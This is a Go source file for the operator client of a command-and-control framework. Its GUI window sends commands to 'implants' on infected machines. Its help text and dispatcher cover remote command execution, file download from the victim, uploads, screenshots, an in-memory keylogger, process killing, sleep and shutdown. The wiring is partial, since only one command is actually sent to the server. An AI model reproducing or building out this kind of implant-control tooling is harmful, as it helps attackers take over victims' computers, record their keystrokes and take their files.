package mainmenu

import (
	"Client/Common"
	"encoding/json"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/widget"
	"log"
	"strings"
)

var (
	HelpMenuString           string
	ImplantsInteractionMenus []*Common.ImplantInteractionMenu
)

func ParseImplantCommand(Command string) {
	//parse the command and send it to the implant.

	var (
		ImplantName  string
		cmd          string
		subcmd       string
		split_string []string
		PrevCmdWSub  string
		PrevCmd      string
		cmdsplit     []string
		args         []string
		menuobj      *Common.ImplantInteractionMenu
	)

	split_string = strings.Split(Command, "/")
	ImplantName = split_string[0]
	CmdAndArgsString := split_string[1]

	if strings.Contains(CmdAndArgsString, " ") {
		cmdsplit = strings.Split(CmdAndArgsString, " ")
		cmd = cmdsplit[0]
		args = cmdsplit[1:]
	} else {
		cmd = CmdAndArgsString
	}

	if cmd == "help" && len(args) > 0 {
		subcmd = args[0]
	}

	for _, menu := range ImplantsInteractionMenus {
		if menu.ImplantName == ImplantName {
			menu.EntryBar.SetText("")
			menuobj = menu
			break
		}
	}

	//save the previous text in the log.
	if menuobj != nil {
		menuobj.PreviousText = menuobj.ImplantLog.Text
	} else {
		log.Println("[error] unable to find menu object for implant: ", ImplantName)
		return
	}

	if subcmd != "" {
		PrevCmdWSub = "\n> " + cmd + " " + subcmd + "\n"
	} else {
		PrevCmd = "\n> " + cmd + "\n"
	}

	switch strings.ToLower(cmd) {
	case "help":
		if subcmd != "" {
			switch strings.ToLower(subcmd) {
			case "execute":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Execute Command Help:\n" +
					"Execute a command on the implant.\n" +
					"usage: execute <command>\n" +
					"example: execute whoami\n" +
					"example: exec \"powershell -c 'whoami'\"\n")
				break

			case "exec":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Execute Command Help:\n" +
					"Execute a command on the implant.\n" +
					"usage: execute <command>\n" +
					"example: execute whoami\n" +
					"example: exec \"powershell -c 'whoami'\"\n")
				break

			case "download":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Download Command Help:\n" +
					"Download a file from the target pc implant is infecting.\n" +
					"usage: download <remote file location> <local file location>\n" +
					"example: download C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n")
				break

			case "upload":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Upload Command Help:\n" +
					"Upload a file to the target pc implant is infecting.\n" +
					"usage: upload <local file location> <remote file location>\n" +
					"example: upload C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n")
				break

			case "screenshot":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Screenshot Command Help:\n" +
					"Take a screenshot of the desktop.\n" +
					"usage: screenshot\n" +
					"example: screenshot\n")
				break

			case "keylogger":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Keylogger Command Help:\n" +
					"Start / Stop Keylogger on implant. This will be a reflected application loaded into memory.\n" +
					"usage: keylogger start <local file storage location> \n" +
					"example: keylogger start C:\\Users\\user\\Documents\\keylog.txt\n" +
					"example: keylogger stop\n")
				break

			case "shutdown":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Shutdown Command Help:\n" +
					"Kill the implant.\n" +
					"usage: shutdown\n" +
					"example: shutdown\n")
				break

			case "sleep":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Sleep Command Help:\n" +
					"Set new sleep time on implant\n" +
					"usage: sleep <time in seconds>\n" +
					"example: sleep 60\n")
				break

			case "list":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Command Help:\n" +
					"List all files in the current directory. The opt: means optional\n" +
					"usage: list, ls, dir <opt: directory>\n" +
					"example: list C:\\Users\\user\\Documents\n" +
					"example: ls\n")
				break

			case "ls":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Command Help:\n" +
					"List all files in the current directory. The opt: means optional\n" +
					"usage: list, ls, dir <opt: directory>\n" +
					"example: list C:\\Users\\user\\Documents\n" +
					"example: ls\n")
				break

			case "dir":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Command Help:\n" +
					"List all files in the current directory. The opt: means optional\n" +
					"usage: list, ls, dir <opt: directory>\n" +
					"example: list C:\\Users\\user\\Documents\n" +
					"example: ls\n")
				break

			case "cd":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "CD Command Help:\n" +
					"Change working directory on implant.\n" +
					"usage: cd <directory>\n" +
					"example: cd C:\\Users\\user\\Documents\n")
				break

			case "pwd":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "PWD Command Help:\n" +
					"Print working directory on implant.\n" +
					"usage: pwd\n" +
					"example: pwd\n")
				break

			case "ps":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "PS Command Help:\n" +
					"List all running processes on implant.\n" +
					"usage: ps, proc\n" +
					"example: ps\n")
				break

			case "proc":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "PS Command Help:\n" +
					"List all running processes on implant.\n" +
					"usage: ps, proc\n" +
					"example: ps\n")
				break

			case "kill":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Kill Command Help:\n" +
					"Kill a process on the implant.\n" +
					"usage: kill <process id>\n" +
					"example: kill 1234\n")
				break

			case "lm":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Modules Command Help:\n" +
					"List all loaded modules on the implant.\n" +
					"usage: lm\n" +
					"example: lm\n")
				break

			case "clear":
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Clear Command Help:\n" +
					"Clear the log.\n" +
					"usage: clear\n" +
					"example: clear\n")
				break

			default:
				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + HelpMenuString)
				break
			}
			break
		} else {
			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + HelpMenuString)
			break
		}

	case "execute":
		//execute a command on the implant.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "exec":
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "download":
		//download a file from the target pc implant is infecting.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "upload":
		//upload a file to the target pc implant is infecting.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "screenshot":
		//take a screenshot of the desktop.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "keylogger":
		//start / stop keylogger on implant. This will be a reflected application loaded into memory.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "shutdown":
		//kill the implant.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "sleep":
		//set new sleep time on implant
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "list":
		//list all files in the current directory.
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "ls":
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "dir":

		SendImplantCommand(cmd, args, ImplantName)
		break
	case "cd":
		//change directory on implant.
		str := fmt.Sprintf("[*] Changing directory to %s on implant.\n", args[0])
		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "pwd":
		//print working directory on implant.
		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Printing working directory on the implant.\n")
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "ps":
		//list all running processes on implant.
		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Listing all running processes on the implant.\n")
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "proc":
		//list all running processes on implant.
		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Listing all running processes on the implant.\n")
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "kill":
		//kill a process on the implant.
		str := fmt.Sprintf("[*] Killing process %d on implant.\n", args[0])
		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "lm":
		//list all loaded modules on the implant.
		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Listing all loaded modules on the implant.\n")
		SendImplantCommand(cmd, args, ImplantName)
		break
	case "clear":
		menuobj.ImplantLog.SetText("")
		break

	default: //no recognized command print the help menu
		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + HelpMenuString)
		break
	}

	textlength := len(menuobj.ImplantLog.Text)
	menuobj.ImplantLog.CursorRow = textlength
	menuobj.ImplantLog.Refresh()

}

func SendImplantCommand(Command string, args []string, ImplantName string) {
	var (
		WSMessage = Common.WebSocketMessage{
			MessageType: "ImplantCommand",
			Message:     "",
		}
		ImplantCmdData Common.ImplantCommandData
	)
	ImplantCmdData.ImplantName = ImplantName
	ImplantCmdData.Command = Command
	ImplantCmdData.Args = args

	JData, err := json.Marshal(ImplantCmdData)
	if err != nil {
		log.Println("[error] attempting to marshal json data. [SendImplantCommand]:", err)
		return
	}
	WSMessage.Message = string(JData)

	switch Command {
	case "lm":
		//list all loaded modules on the implant.
		err = g_clientobj.Conn.WriteJSON(WSMessage)
		if err != nil {
			log.Println("[error] attempting to send implant command to the server websocket.", err)
		}

	default:
		break
	}
}

func InteractWithImplant(FyneApp fyne.App) {
	var (
		ImplantName            string
		ImplantNum             int
		ImplantInteractionMenu Common.ImplantInteractionMenu
	)

	//Get the selected implant number.
	ImplantNum = Common.ImplantData[Common.SelectedImplant.Row].ImplantNum
	ImplantName = Common.ImplantData[Common.SelectedImplant.Row].ImplantName
	log.Println("Interacting with implant number: ", ImplantNum)

	NewWindow := FyneApp.NewWindow("Interact with Implant")

	//Create the form for interacting with the implant.
	ImplantInteractionMenu.ImplantLog = widget.NewMultiLineEntry()
	ImplantInteractionMenu.ImplantLog.Disable()
	ImplantInteractionMenu.ImplantLog.SetMinRowsVisible(30)
	ImplantInteractionMenu.ImplantName = ImplantName

	HelpMenuString = fmt.Sprintf("%s Help Menu:\nPlease use all listed commands without the '[,]' characters\n", ImplantName)
	HelpMenuString += "[help] - Display this help menu.\n[help] [command] - Display help for a specific command.\n"
	HelpMenuString += "[execute / exec] - Execute a command on the implant.\n"
	HelpMenuString += "[download] - Download a file from the target  pc implant is infecting.\n"
	HelpMenuString += "[upload] - Upload a file to the target pc implant is infecting.\n"
	HelpMenuString += "[screenshot] - Take a screenshot of the desktop.\n"
	HelpMenuString += "[keylogger] - Start / Stop Keylogger on implant. This will be a reflected application loaded into memory.\n"
	HelpMenuString += "[shutdown] - kill the implant.\n"
	HelpMenuString += "[sleep] - Set new sleep time on implant\n"
	HelpMenuString += "[list / ls / dir] - List all files in the current directory.\n"
	HelpMenuString += "[cd] - Change directory on implant.\n"
	HelpMenuString += "[pwd] - Print working directory on implant.\n"
	HelpMenuString += "[ps / proc] - List all running processes on implant.\n"
	HelpMenuString += "[kill] - Kill a process on the implant.\n"
	HelpMenuString += "[lm] - List all loaded modules on the implant.\n"
	HelpMenuString += "[clear] - Clear the log.\n"

	ImplantInteractionMenu.ImplantLog.SetText(HelpMenuString)

	ImplantsInteractionMenus = append(ImplantsInteractionMenus, &ImplantInteractionMenu)

	//some fucking go wizardry to ensure that we can update our team's chat if we press enter with text in the chat entry field.
	ImplantInteractionMenu.EntryBar = Common.NewCustomChatEntry(func(text string) {
		ParseImplantCommand(ImplantName + "/" + text)
	})

	//Teams chat entry's combined into one form.
	ImplantForm := &widget.Form{
		Items: []*widget.FormItem{
			{Text: "", Widget: ImplantInteractionMenu.ImplantLog},
			{Text: ImplantName, Widget: ImplantInteractionMenu.EntryBar},
		},
		OnSubmit: func() {
			ParseImplantCommand(ImplantName + "/" + ImplantInteractionMenu.EntryBar.Text)
		},
		OnCancel:   NewWindow.Close,
		SubmitText: "",
		CancelText: "Exit",
	}
	NewWindow.SetContent(ImplantForm)
	size := fyne.Size{Height: 1080.0, Width: 1080.0}
	NewWindow.Resize(size)
	NewWindow.Show()
}

func CreateImplantTable(Window fyne.Window, FyneApp fyne.App) *widget.Table {

	Interact := fyne.NewMenuItem("Interact", func() { InteractWithImplant(FyneApp) })
	menu := fyne.NewMenu("Implant Options", Interact)
	PopUpMenu := widget.NewPopUpMenu(menu, Window.Canvas())
	return Common.CreateImplantTableObject(PopUpMenu)
}

func AddImplantToTable(ImplantData Common.ImplantTableData) {
	//get the actual process name. Not the entire included path.
	split := strings.Split(ImplantData.Process, "\\")
	ImplantData.Process = split[len(split)-1]

	//get the length of the number of current implants.
	count := len(Common.ImplantData)
	ImplantData.ImplantNum = count + 1

	//append implant to our implant table.

	Common.ImplantData = append(Common.ImplantData, ImplantData)
	Common.ImplantTable.Refresh()
}

func RemoveImplantFromTable() {

}

func GetActiveImplants(clientobj *Common.Client, Message Common.WebSocketMessage) ([]byte, error) {

	endpoint := "https://" + clientobj.Server + "/GetActiveImplants"
	JData, err := json.Marshal(Message)

	data, err := Common.PerformHTTPReq(clientobj, endpoint, JData)
	if err != nil {
		if err.Error() == "unauthorized" {
			clientobj.Authenticated = false
		}
		log.Println("[error] attempting to retrieve implant data", err)
	}

	trimedstr := strings.Trim(string(data), "\"")

	decoded := Common.Base64Decode(trimedstr)

	return decoded, nil

}
